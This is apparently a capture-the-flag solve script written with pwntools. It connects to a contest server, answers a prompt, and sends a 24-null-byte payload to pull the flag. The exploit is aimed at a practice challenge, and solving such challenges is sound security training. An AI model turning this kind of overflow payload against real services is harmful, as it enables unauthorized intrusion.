from pwn import *

exe = context.binary = ELF('challenge')
io = remote('chal.osugaming.lol', 7279)

io.recvuntil(b'How much pp did you get? ')
io.sendline(b'727')
#gdb.attach(io)
io.recvuntil(b'Any last words?\n')
payload = b'\x00' * 24
io.sendline(payload)
io.recvline()
io.recvline()
io.recvline()
print(io.recvline())